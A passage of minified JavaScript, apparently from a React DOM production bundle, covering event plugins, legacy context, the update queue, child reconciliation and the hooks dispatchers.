nr(e,t){if(er(e,t))return!0;if("object"!==typeof e||null===e||"object"!==typeof t||null===t)return!1;var n=Object.keys(e),a=Object.keys(t);if(n.length!==a.length)return!1;for(a=0;a<n.length;a++)if(!tr.call(t,n[a])||!er(e[n[a]],t[n[a]]))return!1;return!0}var ar=L&&"documentMode"in document&&11>=document.documentMode,rr={select:{phasedRegistrationNames:{bubbled:"onSelect",captured:"onSelectCapture"},dependencies:"blur contextmenu dragend focus keydown keyup mousedown mouseup selectionchange".split(" ")}},lr=null,or=null,ir=null,cr=!1;function sr(e,t){var n=t.window===t?t.document:9===t.nodeType?t:t.ownerDocument;return cr||null==lr||lr!==vn(n)?null:(n=lr,"selectionStart"in n&&jn(n)?n={start:n.selectionStart,end:n.selectionEnd}:(n=(n.ownerDocument&&n.ownerDocument.defaultView||window).getSelection(),n={anchorNode:n.anchorNode,anchorOffset:n.anchorOffset,focusNode:n.focusNode,focusOffset:n.focusOffset}),ir&&nr(ir,n)?null:(ir=n,e=ra.getPooled(rr.select,or,e,t),e.type="select",e.target=lr,Jn(e),e))}var ur={eventTypes:rr,extractEvents:function(e,t,n,a,r,l){if(r=l||(a.window===a?a.document:9===a.nodeType?a:a.ownerDocument),!(l=!r)){e:{r=rt(r),l=C.onSelect;for(var o=0;o<l.length;o++)if(!r.has(l[o])){r=!1;break e}r=!0}l=!r}if(l)return null;switch(r=t?Bn(t):window,e){case"focus":(Sa(r)||"true"===r.contentEditable)&&(lr=r,or=t,ir=null);break;case"blur":ir=or=lr=null;break;case"mousedown":cr=!0;break;case"contextmenu":case"mouseup":case"dragend":return cr=!1,sr(n,a);case"selectionchange":if(ar)break;case"keydown":case"keyup":return sr(n,a)}return null}},dr=ra.extend({animationName:null,elapsedTime:null,pseudoElement:null}),mr=ra.extend({clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),pr=za.extend({relatedTarget:null});function hr(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,0===e&&13===t&&(e=13)):e=t,10===e&&(e=13),32<=e||13===e?e:0}var gr={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},fr={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Er=za.extend({key:function(e){if(e.key){var t=gr[e.key]||e.key;if("Unidentified"!==t)return t}return"keypress"===e.type?(e=hr(e),13===e?"Enter":String.fromCharCode(e)):"keydown"===e.type||"keyup"===e.type?fr[e.keyCode]||"Unidentified":""},location:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,repeat:null,locale:null,getModifierState:Wa,charCode:function(e){return"keypress"===e.type?hr(e):0},keyCode:function(e){return"keydown"===e.type||"keyup"===e.type?e.keyCode:0},which:function(e){return"keypress"===e.type?hr(e):"keydown"===e.type||"keyup"===e.type?e.keyCode:0}}),br=Qa.extend({dataTransfer:null}),vr=za.extend({touches:null,targetTouches:null,changedTouches:null,altKey:null,metaKey:null,ctrlKey:null,shiftKey:null,getModifierState:Wa}),yr=ra.extend({propertyName:null,elapsedTime:null,pseudoElement:null}),kr=Qa.extend({deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:null,deltaMode:null}),wr={eventTypes:$t,extractEvents:function(e,t,n,a){var r=Gt.get(e);if(!r)return null;switch(e){case"keypress":if(0===hr(n))return null;case"keydown":case"keyup":e=Er;break;case"blur":case"focus":e=pr;break;case"click":if(2===n.button)return null;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":e=Qa;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":e=br;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":e=vr;break;case Ye:case Ze:case et:e=dr;break;case tt:e=yr;break;case"scroll":e=za;break;case"wheel":e=kr;break;case"copy":case"cut":case"paste":e=mr;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":e=Ka;break;default:e=ra}return t=e.getPooled(r,t,n,a),Jn(t),t}};if(v)throw Error(o(101));v=Array.prototype.slice.call("ResponderEventPlugin SimpleEventPlugin EnterLeaveEventPlugin ChangeEventPlugin SelectEventPlugin BeforeInputEventPlugin".split(" ")),k();var xr=Hn;g=Wn,f=xr,E=Bn,A({SimpleEventPlugin:wr,EnterLeaveEventPlugin:Ya,ChangeEventPlugin:Ua,SelectEventPlugin:ur,BeforeInputEventPlugin:xa});var jr=[],Sr=-1;function Cr(e){0>Sr||(e.current=jr[Sr],jr[Sr]=null,Sr--)}function Ar(e,t){Sr++,jr[Sr]=e.current,e.current=t}var Lr={},Tr={current:Lr},Nr={current:!1},Or=Lr;function Ir(e,t){var n=e.type.contextTypes;if(!n)return Lr;var a=e.stateNode;if(a&&a.__reactInternalMemoizedUnmaskedChildContext===t)return a.__reactInternalMemoizedMaskedChildContext;var r,l={};for(r in n)l[r]=t[r];return a&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=l),l}function Pr(e){return e=e.childContextTypes,null!==e&&void 0!==e}function Rr(){Cr(Nr),Cr(Tr)}function _r(e,t,n){if(Tr.current!==Lr)throw Error(o(168));Ar(Tr,t),Ar(Nr,n)}function qr(e,t,n){var a=e.stateNode;if(e=t.childContextTypes,"function"!==typeof a.getChildContext)return n;for(var l in a=a.getChildContext(),a)if(!(l in e))throw Error(o(108,ke(t)||"Unknown",l));return r({},n,{},a)}function Mr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Lr,Or=Tr.current,Ar(Tr,e),Ar(Nr,Nr.current),!0}function Fr(e,t,n){var a=e.stateNode;if(!a)throw Error(o(169));n?(e=qr(e,t,Or),a.__reactInternalMemoizedMergedChildContext=e,Cr(Nr),Cr(Tr),Ar(Tr,e)):Cr(Nr),Ar(Nr,n)}var Dr=l.unstable_runWithPriority,Ur=l.unstable_scheduleCallback,zr=l.unstable_cancelCallback,Hr=l.unstable_requestPaint,Br=l.unstable_now,Wr=l.unstable_getCurrentPriorityLevel,Vr=l.unstable_ImmediatePriority,$r=l.unstable_UserBlockingPriority,Gr=l.unstable_NormalPriority,Xr=l.unstable_LowPriority,Qr=l.unstable_IdlePriority,Kr={},Jr=l.unstable_shouldYield,Yr=void 0!==Hr?Hr:function(){},Zr=null,el=null,tl=!1,nl=Br(),al=1e4>nl?Br:function(){return Br()-nl};function rl(){switch(Wr()){case Vr:return 99;case $r:return 98;case Gr:return 97;case Xr:return 96;case Qr:return 95;default:throw Error(o(332))}}function ll(e){switch(e){case 99:return Vr;case 98:return $r;case 97:return Gr;case 96:return Xr;case 95:return Qr;default:throw Error(o(332))}}function ol(e,t){return e=ll(e),Dr(e,t)}function il(e,t,n){return e=ll(e),Ur(e,t,n)}function cl(e){return null===Zr?(Zr=[e],el=Ur(Vr,ul)):Zr.push(e),Kr}function sl(){if(null!==el){var e=el;el=null,zr(e)}ul()}function ul(){if(!tl&&null!==Zr){tl=!0;var e=0;try{var t=Zr;ol(99,(function(){for(;e<t.length;e++){var n=t[e];do{n=n(!0)}while(null!==n)}})),Zr=null}catch(n){throw null!==Zr&&(Zr=Zr.slice(e+1)),Ur(Vr,sl),n}finally{tl=!1}}}function dl(e,t,n){return n/=10,1073741821-(1+((1073741821-e+t/10)/n|0))*n}function ml(e,t){if(e&&e.defaultProps)for(var n in t=r({},t),e=e.defaultProps,e)void 0===t[n]&&(t[n]=e[n]);return t}var pl={current:null},hl=null,gl=null,fl=null;function El(){fl=gl=hl=null}function bl(e){var t=pl.current;Cr(pl),e.type._context._currentValue=t}function vl(e,t){for(;null!==e;){var n=e.alternate;if(e.childExpirationTime<t)e.childExpirationTime=t,null!==n&&n.childExpirationTime<t&&(n.childExpirationTime=t);else{if(!(null!==n&&n.childExpirationTime<t))break;n.childExpirationTime=t}e=e.return}}function yl(e,t){hl=e,fl=gl=null,e=e.dependencies,null!==e&&null!==e.firstContext&&(e.expirationTime>=t&&(Xo=!0),e.firstContext=null)}function kl(e,t){if(fl!==e&&!1!==t&&0!==t)if("number"===typeof t&&1073741823!==t||(fl=e,t=1073741823),t={context:e,observedBits:t,next:null},null===gl){if(null===hl)throw Error(o(308));gl=t,hl.dependencies={expirationTime:0,firstContext:t,responders:null}}else gl=gl.next=t;return e._currentValue}var wl=!1;function xl(e){e.updateQueue={baseState:e.memoizedState,baseQueue:null,shared:{pending:null},effects:null}}function jl(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,baseQueue:e.baseQueue,shared:e.shared,effects:e.effects})}function Sl(e,t){return e={expirationTime:e,suspenseConfig:t,tag:0,payload:null,callback:null,next:null},e.next=e}function Cl(e,t){if(e=e.updateQueue,null!==e){e=e.shared;var n=e.pending;null===n?t.next=t:(t.next=n.next,n.next=t),e.pending=t}}function Al(e,t){var n=e.alternate;null!==n&&jl(n,e),e=e.updateQueue,n=e.baseQueue,null===n?(e.baseQueue=t.next=t,t.next=t):(t.next=n.next,n.next=t)}function Ll(e,t,n,a){var l=e.updateQueue;wl=!1;var o=l.baseQueue,i=l.shared.pending;if(null!==i){if(null!==o){var c=o.next;o.next=i.next,i.next=c}o=i,l.shared.pending=null,c=e.alternate,null!==c&&(c=c.updateQueue,null!==c&&(c.baseQueue=i))}if(null!==o){c=o.next;var s=l.baseState,u=0,d=null,m=null,p=null;if(null!==c){var h=c;do{if(i=h.expirationTime,i<a){var g={expirationTime:h.expirationTime,suspenseConfig:h.suspenseConfig,tag:h.tag,payload:h.payload,callback:h.callback,next:null};null===p?(m=p=g,d=s):p=p.next=g,i>u&&(u=i)}else{null!==p&&(p=p.next={expirationTime:1073741823,suspenseConfig:h.suspenseConfig,tag:h.tag,payload:h.payload,callback:h.callback,next:null}),qc(i,h.suspenseConfig);e:{var f=e,E=h;switch(i=t,g=n,E.tag){case 1:if(f=E.payload,"function"===typeof f){s=f.call(g,s,i);break e}s=f;break e;case 3:f.effectTag=-4097&f.effectTag|64;case 0:if(f=E.payload,i="function"===typeof f?f.call(g,s,i):f,null===i||void 0===i)break e;s=r({},s,i);break e;case 2:wl=!0}}null!==h.callback&&(e.effectTag|=32,i=l.effects,null===i?l.effects=[h]:i.push(h))}if(h=h.next,null===h||h===c){if(i=l.shared.pending,null===i)break;h=o.next=i.next,i.next=c,l.baseQueue=o=i,l.shared.pending=null}}while(1)}null===p?d=s:p.next=m,l.baseState=d,l.baseQueue=p,Mc(u),e.expirationTime=u,e.memoizedState=s}}function Tl(e,t,n){if(e=t.effects,t.effects=null,null!==e)for(t=0;t<e.length;t++){var a=e[t],r=a.callback;if(null!==r){if(a.callback=null,a=r,r=n,"function"!==typeof a)throw Error(o(191,a));a.call(r)}}}var Nl=ee.ReactCurrentBatchConfig,Ol=(new a.Component).refs;function Il(e,t,n,a){t=e.memoizedState,n=n(a,t),n=null===n||void 0===n?t:r({},t,n),e.memoizedState=n,0===e.expirationTime&&(e.updateQueue.baseState=n)}var Pl={isMounted:function(e){return!!(e=e._reactInternalFiber)&&lt(e)===e},enqueueSetState:function(e,t,n){e=e._reactInternalFiber;var a=wc(),r=Nl.suspense;a=xc(a,e,r),r=Sl(a,r),r.payload=t,void 0!==n&&null!==n&&(r.callback=n),Cl(e,r),jc(e,a)},enqueueReplaceState:function(e,t,n){e=e._reactInternalFiber;var a=wc(),r=Nl.suspense;a=xc(a,e,r),r=Sl(a,r),r.tag=1,r.payload=t,void 0!==n&&null!==n&&(r.callback=n),Cl(e,r),jc(e,a)},enqueueForceUpdate:function(e,t){e=e._reactInternalFiber;var n=wc(),a=Nl.suspense;n=xc(n,e,a),a=Sl(n,a),a.tag=2,void 0!==t&&null!==t&&(a.callback=t),Cl(e,a),jc(e,n)}};function Rl(e,t,n,a,r,l,o){return e=e.stateNode,"function"===typeof e.shouldComponentUpdate?e.shouldComponentUpdate(a,l,o):!t.prototype||!t.prototype.isPureReactComponent||(!nr(n,a)||!nr(r,l))}function _l(e,t,n){var a=!1,r=Lr,l=t.contextType;return"object"===typeof l&&null!==l?l=kl(l):(r=Pr(t)?Or:Tr.current,a=t.contextTypes,l=(a=null!==a&&void 0!==a)?Ir(e,r):Lr),t=new t(n,l),e.memoizedState=null!==t.state&&void 0!==t.state?t.state:null,t.updater=Pl,e.stateNode=t,t._reactInternalFiber=e,a&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=l),t}function ql(e,t,n,a){e=t.state,"function"===typeof t.componentWillReceiveProps&&t.componentWillReceiveProps(n,a),"function"===typeof t.UNSAFE_componentWillReceiveProps&&t.UNSAFE_componentWillReceiveProps(n,a),t.state!==e&&Pl.enqueueReplaceState(t,t.state,null)}function Ml(e,t,n,a){var r=e.stateNode;r.props=n,r.state=e.memoizedState,r.refs=Ol,xl(e);var l=t.contextType;"object"===typeof l&&null!==l?r.context=kl(l):(l=Pr(t)?Or:Tr.current,r.context=Ir(e,l)),Ll(e,n,r,a),r.state=e.memoizedState,l=t.getDerivedStateFromProps,"function"===typeof l&&(Il(e,t,l,n),r.state=e.memoizedState),"function"===typeof t.getDerivedStateFromProps||"function"===typeof r.getSnapshotBeforeUpdate||"function"!==typeof r.UNSAFE_componentWillMount&&"function"!==typeof r.componentWillMount||(t=r.state,"function"===typeof r.componentWillMount&&r.componentWillMount(),"function"===typeof r.UNSAFE_componentWillMount&&r.UNSAFE_componentWillMount(),t!==r.state&&Pl.enqueueReplaceState(r,r.state,null),Ll(e,n,r,a),r.state=e.memoizedState),"function"===typeof r.componentDidMount&&(e.effectTag|=4)}var Fl=Array.isArray;function Dl(e,t,n){if(e=n.ref,null!==e&&"function"!==typeof e&&"object"!==typeof e){if(n._owner){if(n=n._owner,n){if(1!==n.tag)throw Error(o(309));var a=n.stateNode}if(!a)throw Error(o(147,e));var r=""+e;return null!==t&&null!==t.ref&&"function"===typeof t.ref&&t.ref._stringRef===r?t.ref:(t=function(e){var t=a.refs;t===Ol&&(t=a.refs={}),null===e?delete t[r]:t[r]=e},t._stringRef=r,t)}if("string"!==typeof e)throw Error(o(284));if(!n._owner)throw Error(o(290,e))}return e}function Ul(e,t){if("textarea"!==e.type)throw Error(o(31,"[object Object]"===Object.prototype.toString.call(t)?"object with keys {"+Object.keys(t).join(", ")+"}":t,""))}function zl(e){function t(t,n){if(e){var a=t.lastEffect;null!==a?(a.nextEffect=n,t.lastEffect=n):t.firstEffect=t.lastEffect=n,n.nextEffect=null,n.effectTag=8}}function n(n,a){if(!e)return null;for(;null!==a;)t(n,a),a=a.sibling;return null}function a(e,t){for(e=new Map;null!==t;)null!==t.key?e.set(t.key,t):e.set(t.index,t),t=t.sibling;return e}function r(e,t){return e=ls(e,t),e.index=0,e.sibling=null,e}function l(t,n,a){return t.index=a,e?(a=t.alternate,null!==a?(a=a.index,a<n?(t.effectTag=2,n):a):(t.effectTag=2,n)):n}function i(t){return e&&null===t.alternate&&(t.effectTag=2),t}function c(e,t,n,a){return null===t||6!==t.tag?(t=cs(n,e.mode,a),t.return=e,t):(t=r(t,n),t.return=e,t)}function s(e,t,n,a){return null!==t&&t.elementType===n.type?(a=r(t,n.props),a.ref=Dl(e,t,n),a.return=e,a):(a=os(n.type,n.key,n.props,null,e.mode,a),a.ref=Dl(e,t,n),a.return=e,a)}function u(e,t,n,a){return null===t||4!==t.tag||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?(t=ss(n,e.mode,a),t.return=e,t):(t=r(t,n.children||[]),t.return=e,t)}function d(e,t,n,a,l){return null===t||7!==t.tag?(t=is(n,e.mode,a,l),t.return=e,t):(t=r(t,n),t.return=e,t)}function m(e,t,n){if("string"===typeof t||"number"===typeof t)return t=cs(""+t,e.mode,n),t.return=e,t;if("object"===typeof t&&null!==t){switch(t.$$typeof){case re:return n=os(t.type,t.key,t.props,null,e.mode,n),n.ref=Dl(e,null,t),n.return=e,n;case le:return t=ss(t,e.mode,n),t.return=e,t}if(Fl(t)||ve(t))return t=is(t,e.mode,n,null),t.return=e,t;Ul(e,t)}return null}function p(e,t,n,a){var r=null!==t?t.key:null;if("string"===typeof n||"number"===typeof n)return null!==r?null:c(e,t,""+n,a);if("object"===typeof n&&null!==n){switch(n.$$typeof){case re:return n.key===r?n.type===oe?d(e,t,n.props.children,a,r):s(e,t,n,a):null;case le:return n.key===r?u(e,t,n,a):null}if(Fl(n)||ve(n))return null!==r?null:d(e,t,n,a,null);Ul(e,n)}return null}function h(e,t,n,a,r){if("string"===typeof a||"number"===typeof a)return e=e.get(n)||null,c(t,e,""+a,r);if("object"===typeof a&&null!==a){switch(a.$$typeof){case re:return e=e.get(null===a.key?n:a.key)||null,a.type===oe?d(t,e,a.props.children,r,a.key):s(t,e,a,r);case le:return e=e.get(null===a.key?n:a.key)||null,u(t,e,a,r)}if(Fl(a)||ve(a))return e=e.get(n)||null,d(t,e,a,r,null);Ul(t,a)}return null}function g(r,o,i,c){for(var s=null,u=null,d=o,g=o=0,f=null;null!==d&&g<i.length;g++){d.index>g?(f=d,d=null):f=d.sibling;var E=p(r,d,i[g],c);if(null===E){null===d&&(d=f);break}e&&d&&null===E.alternate&&t(r,d),o=l(E,o,g),null===u?s=E:u.sibling=E,u=E,d=f}if(g===i.length)return n(r,d),s;if(null===d){for(;g<i.length;g++)d=m(r,i[g],c),null!==d&&(o=l(d,o,g),null===u?s=d:u.sibling=d,u=d);return s}for(d=a(r,d);g<i.length;g++)f=h(d,r,g,i[g],c),null!==f&&(e&&null!==f.alternate&&d.delete(null===f.key?g:f.key),o=l(f,o,g),null===u?s=f:u.sibling=f,u=f);return e&&d.forEach((function(e){return t(r,e)})),s}function f(r,i,c,s){var u=ve(c);if("function"!==typeof u)throw Error(o(150));if(c=u.call(c),null==c)throw Error(o(151));for(var d=u=null,g=i,f=i=0,E=null,b=c.next();null!==g&&!b.done;f++,b=c.next()){g.index>f?(E=g,g=null):E=g.sibling;var v=p(r,g,b.value,s);if(null===v){null===g&&(g=E);break}e&&g&&null===v.alternate&&t(r,g),i=l(v,i,f),null===d?u=v:d.sibling=v,d=v,g=E}if(b.done)return n(r,g),u;if(null===g){for(;!b.done;f++,b=c.next())b=m(r,b.value,s),null!==b&&(i=l(b,i,f),null===d?u=b:d.sibling=b,d=b);return u}for(g=a(r,g);!b.done;f++,b=c.next())b=h(g,r,f,b.value,s),null!==b&&(e&&null!==b.alternate&&g.delete(null===b.key?f:b.key),i=l(b,i,f),null===d?u=b:d.sibling=b,d=b);return e&&g.forEach((function(e){return t(r,e)})),u}return function(e,a,l,c){var s="object"===typeof l&&null!==l&&l.type===oe&&null===l.key;s&&(l=l.props.children);var u="object"===typeof l&&null!==l;if(u)switch(l.$$typeof){case re:e:{for(u=l.key,s=a;null!==s;){if(s.key===u){switch(s.tag){case 7:if(l.type===oe){n(e,s.sibling),a=r(s,l.props.children),a.return=e,e=a;break e}break;default:if(s.elementType===l.type){n(e,s.sibling),a=r(s,l.props),a.ref=Dl(e,s,l),a.return=e,e=a;break e}}n(e,s);break}t(e,s),s=s.sibling}l.type===oe?(a=is(l.props.children,e.mode,c,l.key),a.return=e,e=a):(c=os(l.type,l.key,l.props,null,e.mode,c),c.ref=Dl(e,a,l),c.return=e,e=c)}return i(e);case le:e:{for(s=l.key;null!==a;){if(a.key===s){if(4===a.tag&&a.stateNode.containerInfo===l.containerInfo&&a.stateNode.implementation===l.implementation){n(e,a.sibling),a=r(a,l.children||[]),a.return=e,e=a;break e}n(e,a);break}t(e,a),a=a.sibling}a=ss(l,e.mode,c),a.return=e,e=a}return i(e)}if("string"===typeof l||"number"===typeof l)return l=""+l,null!==a&&6===a.tag?(n(e,a.sibling),a=r(a,l),a.return=e,e=a):(n(e,a),a=cs(l,e.mode,c),a.return=e,e=a),i(e);if(Fl(l))return g(e,a,l,c);if(ve(l))return f(e,a,l,c);if(u&&Ul(e,l),"undefined"===typeof l&&!s)switch(e.tag){case 1:case 0:throw e=e.type,Error(o(152,e.displayName||e.name||"Component"))}return n(e,a)}}var Hl=zl(!0),Bl=zl(!1),Wl={},Vl={current:Wl},$l={current:Wl},Gl={current:Wl};function Xl(e){if(e===Wl)throw Error(o(174));return e}function Ql(e,t){switch(Ar(Gl,t),Ar($l,e),Ar(Vl,Wl),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:Be(null,"");break;default:e=8===e?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=Be(t,e)}Cr(Vl),Ar(Vl,t)}function Kl(){Cr(Vl),Cr($l),Cr(Gl)}function Jl(e){Xl(Gl.current);var t=Xl(Vl.current),n=Be(t,e.type);t!==n&&(Ar($l,e),Ar(Vl,n))}function Yl(e){$l.current===e&&(Cr(Vl),Cr($l))}var Zl={current:0};function eo(e){for(var t=e;null!==t;){if(13===t.tag){var n=t.memoizedState;if(null!==n&&(n=n.dehydrated,null===n||n.data===An||n.data===Ln))return t}else if(19===t.tag&&void 0!==t.memoizedProps.revealOrder){if(0!==(64&t.effectTag))return t}else if(null!==t.child){t.child.return=t,t=t.child;continue}if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}function to(e,t){return{responder:e,props:t}}var no=ee.ReactCurrentDispatcher,ao=ee.ReactCurrentBatchConfig,ro=0,lo=null,oo=null,io=null,co=!1;function so(){throw Error(o(321))}function uo(e,t){if(null===t)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!er(e[n],t[n]))return!1;return!0}function mo(e,t,n,a,r,l){if(ro=l,lo=t,t.memoizedState=null,t.updateQueue=null,t.expirationTime=0,no.current=null===e||null===e.memoizedState?_o:qo,e=n(a,r),t.expirationTime===ro){l=0;do{if(t.expirationTime=0,!(25>l))throw Error(o(301));l+=1,io=oo=null,t.updateQueue=null,no.current=Mo,e=n(a,r)}while(t.expirationTime===ro)}if(no.current=Ro,t=null!==oo&&null!==oo.next,ro=0,io=oo=lo=null,co=!1,t)throw Error(o(300));return e}function po(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return null===io?lo.memoizedState=io=e:io=io.next=e,io}function ho(){if(null===oo){var e=lo.alternate;e=null!==e?e.memoizedState:null}else e=oo.next;var t=null===io?lo.memoizedState:io.next;if(null!==t)io=t,oo=e;else{if(null===e)throw Error(o(310));oo=e,e={memoizedState:oo.memoizedState,baseState:oo.baseState,baseQueue:oo.baseQueue,queue:oo.queue,next:null},null===io?lo.memoizedState=io=e:io=io.next=e}return io}function go(e,t){return"function"===typeof t?t(e):t}function fo(e){var t=ho(),n=t.queue;if(null===n)throw Error(o(311));n.lastRenderedReducer=e;var a=oo,r=a.baseQueue,l=n.pending;if(null!==l){if(null!==r){var i=r.next;r.next=l.next,l.next=i}a.baseQueue=r=l,n.pending=null}if(null!==r){r=r.next,a=a.baseState;var c=i=l=null,s=r;do{var u=s.expirationTime;if(u<ro){var d={expirationTime:s.expirationTime,suspenseConfig:s.suspenseConfig,action:s.action,eagerReducer:s.eagerReducer,eagerState:s.eagerState,next:null};null===c?(i=c=d,l=a):c=c.next=d,u>lo.expirationTime&&(lo.expirationTime=u,Mc(u))}else null!==c&&(c=c.next={expirationTime:1073741823,suspenseConfig:s.suspenseConfig,action:s.action,eagerReducer:s.eagerReducer,eagerState:s.eagerState,next:null}),qc(u,s.suspenseConfig),a=s.eagerReducer===e?s.eagerState:e(a,s.action);s=s.next}while(null!==s&&s!==r);null===c?l=a:c.next=i,er(a,t.memoizedState)||(Xo=!0),t.memoizedState=a,t.baseState=l,t.baseQueue=c,n.lastRenderedState=a}return[t.memoizedState,n.dispatch]}function Eo(e){var t=ho(),n=t.queue;if(null===n)throw Error(o(311));n.lastRenderedReducer=e;var a=n.dispatch,r=n.pending,l=t.memoizedState;if(null!==r){n.pending=null;var i=r=r.next;do{l=e(l,i.action),i=i.next}while(i!==r);er(l,t.memoizedState)||(Xo=!0),t.memoizedState=l,null===t.baseQueue&&(t.baseState=l),n.lastRenderedState=l}return[l,a]}function bo(e){var t=po();return"function"===typeof e&&(e=e()),t.memoizedState=t.baseState=e,e=t.queue={pending:null,dispatch:null,lastRenderedReducer:go,lastRenderedState:e},e=e.dispatch=Po.bind(null,lo,e),[t.memoizedState,e]}function vo(e,t,n,a){return e={tag:e,create:t,destroy:n,deps:a,next:null},t=lo.updateQueue,null===t?(t={lastEffect:null},lo.updateQueue=t,t.lastEffect=e.next=e):(n=t.lastEffect,null===n?t.lastEffect=e.next=e:(a=n.next,n.next=e,e.next=a,t.lastEffect=e)),e}function yo(){return ho().memoizedState}function ko(e,t,n,a){var r=po();lo.effectTag|=e,r.memoizedState=vo(1|t,n,void 0,void 0===a?null:a)}function wo(e,t,n,a){var r=ho();a=void 0===a?null:a;var l=void 0;if(null!==oo){var o=oo.memoizedState;if(l=o.destroy,null!==a&&uo(a,o.deps))return void vo(t,n,l,a)}lo.effectTag|=e,r.memoizedState=vo(1|t,n,l,a)}function xo(e,t){return ko(516,4,e,t)}function jo(e,t){return wo(516,4,e,t)}function So(e,t){return wo(4,2,e,t)}function Co(e,t){return"function"===typeof t?(e=e(),t(e),function(){t(null)}):null!==t&&void 0!==t?(e=e(),t.current=e,function(){t.current=null}):void 0}function Ao(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,wo(4,2,Co.bind(null,t,e),n)}function Lo(){}function To(e,t){return po().memoizedState=[e,void 0===t?null:t],e}function No(e,t){var n=ho();t=void 0===t?null:t;var a=n.memoizedState;return null!==a&&null!==t&&uo(t,a[1])?a[0]:(n.memoizedState=[e,t],e)}function Oo(e,t){var n=ho();t=void 0===t?null:t;var a=n.memoizedState;return null!==a&&null!==t&&uo(t,a[1])?a[0]:(e=e(),n.memoizedState=[e,t],e)}function Io(e,t,n){var a=rl();ol(98>a?98:a,(function(){e(!0)})),ol(97<a?97:a,(function(){var a=ao.suspense;ao.suspense=void 0===t?null:t;try{e(!1),n()}finally{ao.suspense=a}}))}function Po(e,t,n){var a=wc(),r=Nl.suspense;a=xc(a,e,r),r={expirationTime:a,suspenseConfig:r,action:n,eagerReducer:null,eagerState:null,next:null};var l=t.pending;if(null===l?r.next=r:(r.next=l.next,l.next=r),t.pending=r,l=e.alternate,e===lo||null!==l&&l===lo)co=!0,r.expirationTime=ro,lo.expirationTime=ro;else{if(0===e.expirationTime&&(null===l||0===l.expirationTime)&&(l=t.lastRenderedReducer,null!==l))try{var o=t.lastRenderedState,i=l(o,n);if(r.eagerReducer=l,r.eagerState=i,er(i,o))return}catch(c){}jc(e,a)}}var Ro={readContext:kl,useCallback:so,useContext:so,useEffect:so,useImperativeHandle:so,useLayoutEffect:so,useMemo:so,useReducer:so,useRef:so,useState:so,useDebugValue:so,useResponder:so,useDeferredValue:so,useTransition:so},_o={readContext:kl,useCallback:To,useContext:kl,useEffect:xo,useImperativeHandle:function(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,ko(4,2,Co.bind(null,t,e),n)},useLayoutEffect:function(e,t){return ko(4,2,e,t)},useMemo:function(e,t){var n=po();return t=void 0===t?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var a=po();return t=void 0!==n?n(t):t,a.memoizedState=a.baseState=t,e=a.queue={pending:null,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},e=e.dispatch=Po.bind(null,lo,e),[a.memoizedState,e]},useRef:function(e){var t=po();return e={current:e},t.memoizedState=e},useState:bo,useDebugValue:Lo,useResponder:to,useDeferredValue:function(e,t){var n=bo(e),a=n[0],r=n[1];return xo((function(){var n=ao.suspense;ao.suspense=void 0===t?null:t;try{r(e)}finally{ao.suspense=n}}),[e,t]),a},useTransition:function(e){var t=bo(!1),n=t[0];return t=t[1],[To(Io.bind(null,t,e),[t,e]),n]}},qo={readContext:kl,useCallback:No,useContext:kl,useEffect:jo,useImperativeHandle:Ao,useLayoutEffect:So,useMemo:Oo,useReducer:fo,useRef:yo,useState:function(){return fo(go)},useDebugValue:Lo,useResponder:to,useDeferredValue:function(e,t){var n=fo(go),a=n[0],r=n[1];return jo((function(){var n=ao.suspense;ao.suspense=void 0===t?null:t;try{r(e)}finally{ao.suspense=n}}),[e,t]),a},useTransition:function(e){var t=fo(go),n=t[0];return t=t[1],[No(Io.bind(null,t,e),[t,e]),n]}},Mo={readContext:kl,useCallback:No,useContext:kl,useEffect:jo,useImperativeHandle:Ao,useLayoutEffect:So,useMemo:Oo,useReducer:Eo,useRef:yo,useState:function(){return Eo(go)},useDebugValue:Lo,useResponder:to,useDeferredValue:function(e,t){var n=Eo(go),a=n[0],r=n[1];return jo((function(){var n=ao.suspense;ao.suspense=void 0===t?null:t;try{r(e)}finally{ao.suspense=n}}),[e,t]),a},useTransition:function(e){var t=Eo(go),n=t[0];return 